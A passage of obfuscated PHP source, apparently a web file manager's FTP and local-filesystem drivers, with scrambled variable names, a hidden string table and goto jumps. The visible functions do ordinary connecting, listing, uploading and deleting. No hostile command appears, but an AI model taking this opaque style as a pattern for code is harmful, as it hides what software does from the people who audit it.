KodIO::clear($È¼Éµ„); $¹“´™Á = KodIO::clear($¹“´™Á); $¹“´™Á = substr($¹“´™Á, strlen($È¼Éµ„)); if (empty($this->pathDriver)) { return $¹“´™Á; } return $this->pathDriver . $ç¦”¾¯“[8] . ltrim($¹“´™Á, $ç¦”¾¯“[8]); } private function _init($ÙÌˆ…­ = array()) { $¡Ü«÷Õ =& $_SERVER[…É¦À–]; if (!function_exists($¡Ü«÷Õ[1400])) { throw new Exception(LNG($¡Ü«÷Õ[1401])); } $this->config = $ÙÌˆ…­; $this->charsetReset($ÙÌˆ…­); foreach ($ÙÌˆ…­ as $ªøò€„ => $›¥ıÎÑ®) { if (isset($this->{$ªøò€„})) { $this->{$ªøò€„} = $›¥ıÎÑ®; } } return $this->_login($ÙÌˆ…­); } private function _login($ ˜™…İ¯) { $çÎÛö’â =& $_SERVER[…É¦À–]; static $ïåêÈêÓ = array(); $â§¿³‘Œ = md5(json_encode($ ˜™…İ¯)); if (isset($ïåêÈêÓ[$â§¿³‘Œ])) { foreach ($ïåêÈêÓ[$â§¿³‘Œ] as $ Ìó¬ç” => $‰‘ÓëíÖ) { $this->{$ Ìó¬ç”} = $‰‘ÓëíÖ; } return !0; } $ˆå˜÷›å = parse_url(trim($this->server, $çÎÛö’â[8])); $this->host = $ˆå˜÷›å[$çÎÛö’â[182]]; $˜†§ôùü = isset($ˆå˜÷›å[$çÎÛö’â[181]]) && $ˆå˜÷›å[$çÎÛö’â[181]] == $çÎÛö’â[1402] ? !0 : !1; $this->scheme = $˜†§ôùü ? $çÎÛö’â[1403] : $çÎÛö’â[1404]; $this->port = isset($ˆå˜÷›å[$çÎÛö’â[183]]) ? $ˆå˜÷›å[$çÎÛö’â[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ƒ®‘ÇÍ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¥Š™Ù‹Ä = $this->pasv == $çÎÛö’â[88] ? !0 : !1; @ftp_pasv($this->connect, $¥Š™Ù‹Ä); $ïåêÈêÓ[$â§¿³‘Œ] = array($çÎÛö’â[1405] => $this->connect, $çÎÛö’â[182] => $this->host, $çÎÛö’â[181] => $this->scheme, $çÎÛö’â[183] => $this->port); return $ƒ®‘ÇÍ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¼ùé’º, $ƒİÂ±Ô‘ = '', $°á ò– = REPEAT_RENAME) { if ($this->setContent($¼ùé’º, $ƒİÂ±Ô‘)) { return $this->getPathOuter($¼ùé’º); } return !1; } public function mkdir($ÒÔ–ó·Ù, $Ë­óºœ÷ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ÒÔ–ó·Ù = $this->iconvSystem($ÒÔ–ó·Ù); if ($this->_isFolder($ÒÔ–ó·Ù) || @ftp_mkdir($this->connect, $ÒÔ–ó·Ù)) { return $this->getPathOuter($ÒÔ–ó·Ù); } if (!$this->mkdir($this->pathFather($ÒÔ–ó·Ù))) { return !1; } if ($ÒÔ–ó·Ù = @ftp_mkdir($this->connect, $ÒÔ–ó·Ù)) { return $this->getPathOuter($ÒÔ–ó·Ù); } return !1; } public function copyFile($ÀĞÙ†í, $‡¶İ ÆÓ) { if (!$this->_isconn()) { return !1; } $ÕóÚˆ¼ = $this->pathThis($this->iconvSystem($ÀĞÙ†í)); $™¨çƒ‘å = $this->tempFile($ÕóÚˆ¼); $¯îÇËá = $this->iconvApp($™¨çƒ‘å); $this->download($ÀĞÙ†í, $¯îÇËá); $µ¶Èô²ğ = $this->upload($‡¶İ ÆÓ, $¯îÇËá); $this->tempFileRemve($™¨çƒ‘å); return $µ¶Èô²ğ; } public function moveFile($«µ†ª¨Õ, $ö½†ˆÔ‡) { if (!$this->_isconn()) { return !1; } $«µ†ª¨Õ = $this->iconvSystem($«µ†ª¨Õ); $ö½†ˆÔ‡ = $this->iconvSystem($ö½†ˆÔ‡); $»µÍ˜Ù‹ = @ftp_rename($this->connect, $«µ†ª¨Õ, $ö½†ˆÔ‡); return $»µÍ˜Ù‹ ? $this->getPathOuter($ö½†ˆÔ‡) : !1; } public function delFile($·õ÷Ó¢) { if (!$this->_isconn()) { return !1; } $·õ÷Ó¢ = $this->iconvSystem($·õ÷Ó¢); return @ftp_delete($this->connect, $·õ÷Ó¢); } public function delFolder($¿Ÿºüİ›) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $À£ÇÌõË = $öë­«Èä = array(); $this->fileList($¿Ÿºüİ›, $À£ÇÌõË, $öë­«Èä, !0); $this->listItemCache = !0; foreach ($öë­«Èä as $²éæóßü) { $£ı¦¢´ = $this->iconvSystem($²éæóßü[$_SERVER[…É¦À–][32]]); $Í’è•öÒ = @ftp_delete($this->connect, $£ı¦¢´); if (!$Í’è•öÒ) { return !1; } } foreach ($À£ÇÌõË as $£ı¦¢´) { $£ı¦¢´ = $this->iconvSystem($£ı¦¢´); $Í’è•öÒ = @ftp_rmdir($this->connect, $£ı¦¢´); if (!$Í’è•öÒ) { return !1; } } $¿Ÿºüİ› = $this->iconvSystem($¿Ÿºüİ›); return @ftp_rmdir($this->connect, $¿Ÿºüİ›); } public function rename($€ä†÷òÃ, $¥á÷ÙÅ) { $¶¦İÑş =& $_SERVER[…É¦À–]; if (!$this->_isconn()) { return !1; } $ı—çòÎß = $this->fileNameAuto($this->pathFather($€ä†÷òÃ), $¥á÷ÙÅ); $ı—çòÎß = $this->iconvSystem($ı—çòÎß); $€ä†÷òÃ = $this->iconvSystem($€ä†÷òÃ); $ê‹—£÷ = $this->pathFather($€ä†÷òÃ); $ûŸĞ€¸› = rtrim($ê‹—£÷, $¶¦İÑş[8]) . $¶¦İÑş[8] . $ı—çòÎß; $óÊÈñ€ï = @ftp_rename($this->connect, $€ä†÷òÃ, $ûŸĞ€¸›); $ûŸĞ€¸› = $this->iconvApp($ûŸĞ€¸›); return $óÊÈñ€ï ? $this->getPathOuter($ûŸĞ€¸›) : !1; } private function folderInfo($«Ô÷§´, $ŠÒÔ­ââ = false) { $ÛüÜñÙ =& $_SERVER[…É¦À–]; $—ö‹øÛş = array($ÛüÜñÙ[32] => $this->pathThis($«Ô÷§´), $ÛüÜñÙ[84] => $this->getPathOuter($ÛüÜñÙ[8] . $«Ô÷§´), $ÛüÜñÙ[33] => $ÛüÜñÙ[75]); if ($ŠÒÔ­ââ) { return $—ö‹øÛş; } $—ö‹øÛş[$ÛüÜñÙ[201]] = $—ö‹øÛş[$ÛüÜñÙ[85]] = 0; $—ö‹øÛş[$ÛüÜñÙ[202]] = $—ö‹øÛş[$ÛüÜñÙ[203]] = !0; return $—ö‹øÛş; } private function fileInfo($ˆçö¨‚, $âˆ ›Ú = false, $‹ÒßÂ“ = array()) { $¿Òµ¸ºé =& $_SERVER[…É¦À–]; $´¤€ ÄÖ = array($¿Òµ¸ºé[32] => $this->pathThis($ˆçö¨‚), $¿Òµ¸ºé[84] => $this->getPathOuter($¿Òµ¸ºé[8] . $ˆçö¨‚), $¿Òµ¸ºé[33] => $¿Òµ¸ºé[200], $¿Òµ¸ºé[76] => isset($‹ÒßÂ“[$¿Òµ¸ºé[76]]) ? $‹ÒßÂ“[$¿Òµ¸ºé[76]] : 0, $¿Òµ¸ºé[174] => $this->ext($ˆçö¨‚)); if ($âˆ ›Ú) { return $´¤€ ÄÖ; } $´¤€ ÄÖ[$¿Òµ¸ºé[201]] = $´¤€ ÄÖ[$¿Òµ¸ºé[85]] = 0; $´¤€ ÄÖ[$¿Òµ¸ºé[202]] = $´¤€ ÄÖ[$¿Òµ¸ºé[203]] = !0; $Å›´€²¾ = $this->iconvSystem($ˆçö¨‚); $´¤€ ÄÖ[$¿Òµ¸ºé[85]] = @ftp_mdtm($this->connect, $Å›´€²¾); if (empty($‹ÒßÂ“)) { $‹ÒßÂ“ = $this->objectMeta($ˆçö¨‚); if (!$‹ÒßÂ“) { return $´¤€ ÄÖ; } } $´¤€ ÄÖ[$¿Òµ¸ºé[76]] = $‹ÒßÂ“[$¿Òµ¸ºé[76]]; return $´¤€ ÄÖ; } public function size($ññ€ÈŸ¡) { $µĞ§Äı» = $this->objectMeta($ññ€ÈŸ¡); return $µĞ§Äı» ? $µĞ§Äı»[$_SERVER[…É¦À–][76]] : 0; } public function info($–îÒÚ) { if ($this->isFile($–îÒÚ)) { return $this->fileInfo($–îÒÚ, 0); } else { if ($this->isFolder($–îÒÚ)) { return $this->folderInfo($–îÒÚ); } } return !1; } private function fileList($ÛÓ³”¿Ğ, &$Á’ÈÙÕ¾, &$ÆÀŞé€ä, $¥÷«ßëÒ = false) { $œ×äµ¯ =& $_SERVER[…É¦À–]; $ÛÓ³”¿Ğ = $this->iconvSystem($ÛÓ³”¿Ğ); if (!$this->isFolder($ÛÓ³”¿Ğ)) { return !1; } @ftp_chdir($this->connect, $œ×äµ¯[8]); $ÛÓ³”¿Ğ = rtrim($ÛÓ³”¿Ğ, $œ×äµ¯[8]) . $œ×äµ¯[8]; check_abort(); $Šê±—¶ = @ftp_rawlist($this->connect, $ÛÓ³”¿Ğ); if (!$Šê±—¶) { $Šê±—¶ = array(); } $–‚«‚İé = array($œ×äµ¯[10] => 1, $œ×äµ¯[1324] => 1); foreach ($Šê±—¶ as $ìôŒÇöâ) { $†ğşì = $this->_listItem($ìôŒÇöâ); if ($†ğşì[0] == $œ×äµ¯[798]) { continue; } $°ÆØô“ = $†ğşì[8]; if (empty($°ÆØô“) && $°ÆØô“ !== $œ×äµ¯[198] || isset($–‚«‚İé[$°ÆØô“])) { continue; } $°ÆØô“ = $this->iconvApp($ÛÓ³”¿Ğ . ltrim($°ÆØô“, $œ×äµ¯[8])); $¢‚İÛı± = array($œ×äµ¯[32] => $°ÆØô“, $œ×äµ¯[33] => $œ×äµ¯[200], $œ×äµ¯[76] => $†ğşì[4]); if (substr($ìôŒÇöâ, 0, 1) == $œ×äµ¯[1406]) { $¢‚İÛı±[$œ×äµ¯[33]] = $œ×äµ¯[75]; $¢‚İÛı±[$œ×äµ¯[76]] = 0; } $øºşıïÓ = $¢‚İÛı±[$œ×äµ¯[33]] == $œ×äµ¯[75] ? !0 : !1; $this->cacheMethodInfoSet($°ÆØô“, $øºşıïÓ, $¢‚İÛı±); if ($øºşıïÓ) { $Á’ÈÙÕ¾[] = $°ÆØô“; if ($¥÷«ßëÒ) { $this->fileList($°ÆØô“, $Á’ÈÙÕ¾, $ÆÀŞé€ä, $¥÷«ßëÒ); } continue; } $ÆÀŞé€ä[] = $¢‚İÛı±; } $this->cacheMethodInfoSet($ÛÓ³”¿Ğ, !0); } private function _listItem($èÔ«ï) { if (empty($èÔ«ï)) { return array(); } $ùˆ—™Ÿ› = preg_split($_SERVER[…É¦À–][1407], $èÔ«ï); if (count($ùˆ—™Ÿ›) <= 9) { return $ùˆ—™Ÿ›; } $ùˆ—™Ÿ›[8] = trim(substr($èÔ«ï, strpos($èÔ«ï, $ùˆ—™Ÿ›[7]) + strlen($ùˆ—™Ÿ›[7]))); return array_splice($ùˆ—™Ÿ›, 0, 9); } public function listPath($²­ÊÌ—‹, $«®Éıé¿ = false) { $ÕõäÔ–í =& $_SERVER[…É¦À–]; if (!$this->_isconn()) { return !1; } $Ì ¦íÈĞ = $¢Úæƒø¶ = array(); $this->fileList($²­ÊÌ—‹, $Ì ¦íÈĞ, $¢Úæƒø¶); foreach ($Ì ¦íÈĞ as $ï¸ŒÉ¸§ => $Óº•€ßú) { $Ì ¦íÈĞ[$ï¸ŒÉ¸§] = $this->folderInfo($Óº•€ßú, $«®Éıé¿); } foreach ($¢Úæƒø¶ as $ï¸ŒÉ¸§ => $Óº•€ßú) { $¢Úæƒø¶[$ï¸ŒÉ¸§] = $this->fileInfo($Óº•€ßú[$ÕõäÔ–í[32]], $«®Éıé¿, $Óº•€ßú); } return array($ÕõäÔ–í[82] => $Ì ¦íÈĞ, $ÕõäÔ–í[83] => $¢Úæƒø¶); } public function has($ºı„éÖ, $Í’Ğœİœ = false, $‡Ôôá€§ = true) { $”éÆÍŠÇ =& $_SERVER[…É¦À–]; $ß¿ñĞà· = $Í®Ô¤şì = array(); $™‰÷Œ˜ö = $Í’Ğœİœ ? !0 : !1; $this->fileList($ºı„éÖ, $ß¿ñĞà·, $Í®Ô¤şì, $™‰÷Œ˜ö); if ($Í’Ğœİœ) { return array($”éÆÍŠÇ[207] => count($Í®Ô¤şì), $”éÆÍŠÇ[208] => count($ß¿ñĞà·)); } if ($‡Ôôá€§) { if (count($Í®Ô¤şì)) { return !0; } } else { if (count($ß¿ñĞà·)) { return !0; } } return !1; } public function listAll($œÁç»Ôµ) { $â¾ˆŸ =& $_SERVER[…É¦À–]; if (!$this->_isconn()) { return !1; } $ö‰ì·…¼ = $ğÉ•†¾ = array(); $this->fileList($œÁç»Ôµ, $ö‰ì·…¼, $ğÉ•†¾, !0); $Ò—ê†€” = array_to_keyvalue($ğÉ•†¾, $â¾ˆŸ[32]); foreach ($ö‰ì·…¼ as $å€àß¤) { if (is_string($å€àß¤)) { $Ò—ê†€”[$å€àß¤] = array($â¾ˆŸ[76] => 0); } } return $this->listAllFiles($œÁç»Ôµ, $Ò—ê†€”); } public function getContent($“ğİİœÑ) { if (!$this->_isconn()) { return !1; } $“ğİİœÑ = $this->iconvSystem($“ğİİœÑ); return $this->fileSubstr($“ğİİœÑ); } public function setContent($İ¨ÎÈ›‹, $Ôúõˆ = '') { if (!$this->_isconn()) { return !1; } $çùÄŸéê = $this->pathThis($this->iconvSystem($İ¨ÎÈ›‹)); $Áñ‹óºî = $this->tempFile($çùÄŸéê); file_put_contents($Áñ‹óºî, $Ôúõˆ); $óû‘ş = $this->upload($İ¨ÎÈ›‹, $this->iconvApp($Áñ‹óºî)); $this->tempFileRemve($Áñ‹óºî); return $óû‘ş; } public function fileSubstr($­æ“¨’, $ùò¡»´ = 0, $£ ÙèÎù = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($­æ“¨’, $ùò¡»´, $£ ÙèÎù); } private function ftpRequest($ÄŞÒ†·, $¸‘¨Ç» = 0, $Ÿ‰˜Øª½ = false) { $ÄŞÒ†· = $this->iconvSystem($ÄŞÒ†·); $’Š‘†‘» = $this->scheme . $this->host . $_SERVER[…É¦À–][4] . $this->port; $ÎÂæĞ°¶ = curl_init(); curl_setopt($ÎÂæĞ°¶, CURLOPT_URL, $’Š‘†‘» . $this->pathEncode($ÄŞÒ†·)); curl_setopt($ÎÂæĞ°¶, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ÿ‰˜Øª½) { $‰ÊåİÒ¨ = $¸‘¨Ç» + $Ÿ‰˜Øª½ - 1; curl_setopt($ÎÂæĞ°¶, CURLOPT_RANGE, "{$¸‘¨Ç»}\55{$‰ÊåİÒ¨}"); } curl_setopt($ÎÂæĞ°¶, CURLOPT_RETURNTRANSFER, 1); $‚ˆ°Â°Î = curl_exec($ÎÂæĞ°¶); curl_close($ÎÂæĞ°¶); return $‚ˆ°Â°Î; } public function upload($ÖëÑŠ, $‹Ÿí’«Ã, $¯ì¢Š‘í = false, $ËËŠ‰ë© = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ÖëÑŠ))) { return !1; } $ÖëÑŠ = $this->iconvSystem($ÖëÑŠ); $‹Ÿí’«Ã = $this->iconvSystem($‹Ÿí’«Ã); $„İê­öñ = ftp_nb_put($this->connect, $ÖëÑŠ, $‹Ÿí’«Ã, FTP_BINARY); while ($„İê­öñ == FTP_MOREDATA) { $„İê­öñ = ftp_nb_continue($this->connect); } if ($„İê­öñ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ÖëÑŠ); } public function download($°áÇÈã¾, $ÍôÀî–ß = '') { if (!$this->_isconn()) { return !1; } $ÅÚ°äà = $this->pathFather($ÍôÀî–ß); if (!IO::mkdir($ÅÚ°äà)) { return !1; } $°áÇÈã¾ = $this->iconvSystem($°áÇÈã¾); $ÍôÀî–ß = $this->iconvSystem($ÍôÀî–ß); $ÒŒ§¾£ë = ftp_nb_get($this->connect, $ÍôÀî–ß, $°áÇÈã¾, FTP_BINARY); while ($ÒŒ§¾£ë == FTP_MOREDATA) { $ÒŒ§¾£ë = ftp_nb_continue($this->connect); } if ($ÒŒ§¾£ë != FTP_FINISHED) { return !1; } return $this->iconvApp($ÍôÀî–ß); } public function exist($”üË¤¦ƒ) { return $this->isFile($”üË¤¦ƒ) || $this->isFolder($”üË¤¦ƒ); } public function isFile($Šş¶¦´) { return !$this->isFolder($Šş¶¦´) && $this->objectMeta($Šş¶¦´); } public function isFolder($¥©úİ™›) { return $this->cacheMethod($_SERVER[…É¦À–][165], $¥©úİ™›); } protected function objectMeta($ÆúÏäÑü) { return $this->cacheMethod($_SERVER[…É¦À–][167], $ÆúÏäÑü); } protected function _objectMeta($æåƒÀËß) { $³ç±ß•ü =& $_SERVER[…É¦À–]; if ($æåƒÀËß == $³ç±ß•ü[12] || $æåƒÀËß == $³ç±ß•ü[8]) { return array(); } if (!$this->_isconn()) { return !1; } $æåƒÀËß = $this->iconvSystem($æåƒÀËß); $©Éï§ñº = array($³ç±ß•ü[32] => $this->iconvApp($æåƒÀËß), $³ç±ß•ü[33] => $³ç±ß•ü[200], $³ç±ß•ü[76] => 0); @ftp_chdir($this->connect, $³ç±ß•ü[8]); $‘äñ€÷‹ = @ftp_size($this->connect, $æåƒÀËß); if ($‘äñ€÷‹ != -1) { $©Éï§ñº[$³ç±ß•ü[76]] = $‘äñ€÷‹; } else { $›ÜÃÂ€Æ = @ftp_chdir($this->connect, $æåƒÀËß); if (!$›ÜÃÂ€Æ) { return !1; } $©Éï§ñº[$³ç±ß•ü[33]] = $³ç±ß•ü[75]; } return $©Éï§ñº; } protected function _isFolder($¡¾ûí«¥) { $êÔ½î  =& $_SERVER[…É¦À–]; if ($¡¾ûí«¥ == $êÔ½î [12] || $¡¾ûí«¥ == $êÔ½î [8]) { return !0; } $é¾ôÆµË = $this->_objectMeta($¡¾ûí«¥); return isset($é¾ôÆµË[$êÔ½î [33]]) && $é¾ôÆµË[$êÔ½î [33]] == $êÔ½î [75] ? !0 : !1; } } goto eâíÌù; c¦ š …Îé: define($_SERVER[…É¦À–][267], 1); define($_SERVER[…É¦À–][268], 2); define($_SERVER[…É¦À–][269], 3); goto CÎ‚Ò¥Ï“È; eâíÌù: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¡×ÉÆÀª) { if (substr($¡×ÉÆÀª, 0, 2) == $_SERVER[…É¦À–][1323]) { $¡×ÉÆÀª = BASIC_PATH . substr($¡×ÉÆÀª, 2); } return $¡×ÉÆÀª; } public function iconvApp($¥µ—©œ©) { $çğšó¶ì =& $_SERVER[…É¦À–]; global $config; return $this->iconvTo($¥µ—©œ©, $config[$çğšó¶ì[1398]], $config[$çğšó¶ì[1397]]); } public function iconvSystem($¦½„ƒÃé) { $—Ÿ¥Úœ¿ =& $_SERVER[…É¦À–]; global $config; return $this->iconvTo($¦½„ƒÃé, $config[$—Ÿ¥Úœ¿[1397]], $config[$—Ÿ¥Úœ¿[1398]]); } public function getPathOuter($­í¥­ÓÌ) { $¡Áƒ Ç =& $_SERVER[…É¦À–]; $êº±‹Şò = $this->iconvApp($this->pathBase); $­í¥­ÓÌ = $this->iconvApp($­í¥­ÓÌ); if (substr($êº±‹Şò, 0, 2) == $¡Áƒ Ç[1323]) { $êº±‹Şò = BASIC_PATH . substr($êº±‹Şò, 2); } if (substr($­í¥­ÓÌ, 0, 2) == $¡Áƒ Ç[1323]) { $­í¥­ÓÌ = BASIC_PATH . substr($­í¥­ÓÌ, 2); } $êº±‹Şò = KodIO::clear($êº±‹Şò); $­í¥­ÓÌ = KodIO::clear($­í¥­ÓÌ); $­í¥­ÓÌ = substr($­í¥­ÓÌ, strlen($êº±‹Şò)); if (empty($this->pathDriver)) { return $­í¥­ÓÌ; } return $this->pathDriver . $¡Áƒ Ç[8] . ltrim($­í¥­ÓÌ, $¡Áƒ Ç[8]); } public function mkfile($•Öµƒå«, $ÏëÁœÂ² = '', $¶ìª®Ó€ = REPEAT_RENAME) { $•Öµƒå« = $this->iconvSystem($•Öµƒå«); @touch($•Öµƒå«); if ($ÏëÁœÂ²) { file_put_contents($•Öµƒå«, $ÏëÁœÂ²); } @chmod($•Öµƒå«, $this->pathAuth); return is_file($•Öµƒå«) ? $this->getPathOuter($•Öµƒå«) : !1; } public function mkdir($­Å»—ˆê, $™©êÙšÈ = REPEAT_SKIP) { $­Å»—ˆê = $this->iconvSystem($­Å»—ˆê); if (is_dir($­Å»—ˆê)) { return $this->getPathOuter($­Å»—ˆê); } @mkdir($­Å»—ˆê, $this->pathAuth, !0); @chmod($­Å»—ˆê, $this->pathAuth); return is_dir($­Å»—ˆê) ? $this->getPathOuter($­Å»—ˆê) : !1; } public function copyFile($ã ìıË, $¿¿ŠÔÈ«) { $this->mkdir($this->pathFather($¿¿ŠÔÈ«)); $ã ìıË = $this->iconvSystem($ã ìıË); $¿¿ŠÔÈ« = $this->iconvSystem($¿¿ŠÔÈ«); $£Ê‹¶ãğ = copy_64($ã ìıË, $¿¿ŠÔÈ«); @chmod($¿¿ŠÔÈ«, $this->pathAuth); return $£Ê‹¶ãğ ? $this->getPathOuter($¿¿ŠÔÈ«) : !1; } public function moveFile($¿™§÷¥, $íŠ¼äøã) { $this->mkdir($this->pathFather($íŠ¼äøã)); $¿™§÷¥ = $this->iconvSystem($¿™§÷¥); $íŠ¼äøã = $this->iconvSystem($íŠ¼äøã); $úÄ¶ô¯ = intval(@rename($¿™§÷¥, $íŠ¼äøã)); if (!$úÄ¶ô¯) { if ($úÄ¶ô¯ = intval(@copy_64($¿™§÷¥, $íŠ¼äøã))) { @unlink($¿™§÷¥); } } @chmod($íŠ¼äøã, $this->pathAuth); return $úÄ¶ô¯ ? $this->getPathOuter($íŠ¼äøã) : !1; } public function movePath($¾Æ‹ÁÏ¹, $ ¼§¢äÌ, $óÏ±³Ì‡ = false) { $¢Ë¢·óÈ =& $_SERVER[…É¦À–]; $¾Æ‹ÁÏ¹ = $this->iconvSystem($¾Æ‹ÁÏ¹); $ ¼§¢äÌ = $this->iconvSystem($ ¼§¢äÌ); $¼ãéŸ°ê = rtrim($ ¼§¢äÌ, $¢Ë¢·óÈ[8]) . $¢Ë¢·óÈ[8] . ($óÏ±³Ì‡ ? $óÏ±³Ì‡ : get_path_this($¾Æ‹ÁÏ¹)); if (file_exists($¼ãéŸ°ê)) { return !1; } $Æ§±Ò™Ú = intval(@rename($¾Æ‹ÁÏ¹, $¼ãéŸ°ê)); $Æ§±Ò™Ú = file_exists($¼ãéŸ°ê); return $Æ§±Ò™Ú ? $this->getPathOuter($¼ãéŸ°ê) : !1; } public function delFile($˜°¬ÚÅİ) { $˜°¬ÚÅİ = $this->iconvSystem($˜°¬ÚÅİ); if (!@unlink($˜°¬ÚÅİ)) { @chmod($˜°¬ÚÅİ, $this->pathAuth); if (!@unlink($˜°¬ÚÅİ)) { return !1; } } else { return !0; } } public function delFolder($ÉÙ‰ò) { $¬Ş˜³à =& $_SERVER[…É¦À–]; $ÉÙ‰ò = $this->iconvSystem($ÉÙ‰ò); if (!is_dir($ÉÙ‰ò)) { return !0; } if (!($¤·©şô¨ = opendir($ÉÙ‰ò))) { return !1; } while (($ »ş‡í = readdir($¤·©şô¨)) !== !1) { if ($ »ş‡í == $¬Ş˜³à[10] || $ »ş‡í == $¬Ş˜³à[1324]) { continue; } $…šÄ×Êî = $ÉÙ‰ò . $¬Ş˜³à[8] . $ »ş‡í; if (is_file($…šÄ×Êî) || is_link($…šÄ×Êî)) { if (!unlink($…šÄ×Êî)) { chmod($…šÄ×Êî, $this->pathAuth); if (!unlink($…šÄ×Êî)) { return !1; } } } else { if (is_dir($…šÄ×Êî)) { chmod($…šÄ×Êî, $this->pathAuth); $…šÄ×Êî = $this->iconvApp($…šÄ×Êî); if (!$this->delFolder($…šÄ×Êî)) { return !1; } } } } closedir($¤·©şô¨); return rmdir($ÉÙ‰ò); } public function rename($ÈãÛºâŸ, $¬øª°õš) { $öùµöò =& $_SERVER[…É¦À–]; $“€¿ûİ¬ = $this->fileNameAuto($this->pathFather($ÈãÛºâŸ), $¬øª°õš); $“€¿ûİ¬ = $this->iconvSystem($“€¿ûİ¬); $ÈãÛºâŸ = $this->iconvSystem($ÈãÛºâŸ); $úÚÁîìÎ = $this->pathFather($ÈãÛºâŸ); $ÊªÁ—©¨ = rtrim($úÚÁîìÎ, $öùµöò[8]) . $öùµöò[8] . $“€¿ûİ¬; $ø•»ƒ°“ = @rename($ÈãÛºâŸ, $ÊªÁ—©¨); $ÊªÁ—©¨ = $this->iconvApp($ÊªÁ—©¨); return $ø•»ƒ°“ ? $this->getPathOuter($ÊªÁ—©¨) : !1; } public function size($Áí•ØæÛ) { $Áí•ØæÛ = $this->iconvSystem($Áí•ØæÛ); return filesize_64($Áí•ØæÛ); } public function info($ƒæá†ÖÃ) { $ƒæá†ÖÃ = $this->iconvSystem($ƒæá†ÖÃ); if ($this->isFolder($ƒæá†ÖÃ)) { return $this->folderInfo($ƒæá†ÖÃ); } else { if ($this->isFile($ƒæá†ÖÃ)) { return $this->fileInfo($ƒæá†ÖÃ); } } return !1; } protected function infoChildren($·®êùæ, &$ÇÛ£ÖºÆ, $²Ø®ÅñÊ = true) { $¦à¥îç¤ =& $_SERVER[…É¦À–]; check_abort_echo(); $·®êùæ = rtrim($·®êùæ, $¦à¥îç¤[8]) . $¦à¥îç¤[8]; if ($²Ø®ÅñÊ) { $·®êùæ = $this->iconvSystem($·®êùæ); } if (!($²«êƒòÅ = @opendir($·®êùæ))) { return; } while (($é¸ğş ë = readdir($²«êƒòÅ)) !== !1) { if ($é¸ğş ë == $¦à¥îç¤[10] || $é¸ğş ë == $¦à¥îç¤[1324]) { continue; } $´½¢şøÙ = $·®êùæ . $é¸ğş ë; if (is_file($´½¢şøÙ) || is_link($´½¢şøÙ)) { $ÇÛ£ÖºÆ[$¦à¥îç¤[77]]++; $ÇÛ£ÖºÆ[$¦à¥îç¤[76]] += filesize_64($´½¢şøÙ); } else { if (is_dir($´½¢şøÙ)) { $ÇÛ£ÖºÆ[$¦à¥îç¤[78]]++; $this->infoChildren($´½¢şøÙ, $ÇÛ£ÖºÆ, !1); } } } closedir($²«êƒòÅ); } private function folderInfo($Ò¬ÉáŸò, $×ëÛâæª = false) { $Üôé¤Ğ =& $_SERVER[…É¦À–]; $Ò¬ÉáŸò = rtrim($Ò¬ÉáŸò, $Üôé¤Ğ[8]) . $Üôé¤Ğ[8]; $ÜË—Ï¦¢ = $this->iconvApp($this->pathThis($Ò¬ÉáŸò)); if ($×ëÛâæª) { return array($Üôé¤Ğ[32] => $ÜË—Ï¦¢, $Üôé¤Ğ[84] => $this->getPathOuter($Ò¬ÉáŸò), $Üôé¤Ğ[33] => $Üôé¤Ğ[75]); } $¹ªÇÏ™ = array($Üôé¤Ğ[32] => $ÜË—Ï¦¢, $Üôé¤Ğ[84] => $this->getPathOuter($Ò¬ÉáŸò), $Üôé¤Ğ[33] => $Üôé¤Ğ[75], $Üôé¤Ğ[201] => @filectime($Ò¬ÉáŸò), $Üôé¤Ğ[85] => @filemtime($Ò¬ÉáŸò), $Üôé¤Ğ[1408] => @fileatime($Ò¬ÉáŸò), $Üôé¤Ğ[1409] => is_readable($Ò¬ÉáŸò), $Üôé¤Ğ[1410] => is_writable($Ò¬ÉáŸò), $Üôé¤Ğ[1411] => get_mode($Ò¬ÉáŸò)); return $¹ªÇÏ™; } private function fileInfo($§¤Åøå€, $¥ôúÍÑÆ = false) { $‚ÇİŸÛ =& $_SERVER[…É¦À–]; $¿ß“ï‰ = $this->iconvApp($this->pathThis($§¤Åøå€)); if ($¥ôúÍÑÆ) { return array($‚ÇİŸÛ[32] => $¿ß“ï‰, $‚ÇİŸÛ[84] => $this->getPathOuter($§¤Åøå€), $‚ÇİŸÛ[33] => $‚ÇİŸÛ[200], $‚ÇİŸÛ[76] => $this->size($§¤Åøå€), $‚ÇİŸÛ[174] => $this->ext($¿ß“ï‰)); } $¥—¼Ì¶ = array($‚ÇİŸÛ[32] => $¿ß“ï‰, $‚ÇİŸÛ[84] => $this->getPathOuter($§¤Åøå€), $‚ÇİŸÛ[33] => $‚ÇİŸÛ[200], $‚ÇİŸÛ[201] => @filectime($§¤Åøå€), $‚ÇİŸÛ[85] => @filemtime($§¤Åøå€), $‚ÇİŸÛ[1408] => @fileatime($§¤Åøå€), $‚ÇİŸÛ[76] => $this->size($§¤Åøå€), $‚ÇİŸÛ[174] => $this->ext($¿ß“ï‰), $‚ÇİŸÛ[1409] => is_readable($§¤Åøå€), $‚ÇİŸÛ[1410] => is_writable($§¤Åøå€), $‚ÇİŸÛ[1411] => get_mode($§¤Åøå€)); return $¥—¼Ì¶; } public function exist($Î“û£—Í) { $Î“û£—Í = $this->iconvSystem($Î“û£—Í); return @file_exists($Î“û£—Í); } public function isFile($ú·ñ¢èÚ) { $ú·ñ¢èÚ = $this->iconvSystem($ú·ñ¢èÚ); return @is_file($ú·ñ¢èÚ); } public function isFolder($†–Á³ÊŸ) { $†–Á³ÊŸ = $this->iconvSystem($†–Á³ÊŸ); return @is_dir($†–Á³ÊŸ); } public function listPath($Õæıº°‰, $š¨Õåõ = false) { $Óˆá­ä® =& $_SERVER[…É¦À–]; $Õæıº°‰ = $this->iconvSystem($Õæıº°‰); $Õæıº°‰ = rtrim($Õæıº°‰, $Óˆá­ä®[8]) . $Óˆá­ä®[8]; $°¦™¬’œ = 